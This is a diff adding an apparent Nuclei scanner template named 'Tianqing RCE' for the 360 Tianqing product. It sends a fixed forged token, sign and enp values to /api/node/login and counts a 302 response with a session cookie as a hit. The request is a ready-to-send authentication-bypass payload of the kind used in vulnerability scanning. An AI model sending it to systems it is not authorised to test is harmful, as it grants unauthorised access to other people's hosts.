@@ -1,0 +1,25 @@
+id: tianqing-rce
+
+info:
+  name: Tianqing RCE
+  author: zp857
+  severity: critical
+  tags: tianqing,rce,360-tianqing
+
+requests:
+  - raw:
+      - |
+        GET /api/node/login?token=eyJob3N0IjoiMTI3LjAuMC4xIiwidCI6MTY1MjY4ODUzNn0=&sign=8bee417e5487350079c787d5bf8f10c6&enp=1bea7b44f4917cffe3fa13be406b6910 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie: "
+
+      - type: status
+        status:
+          - 302
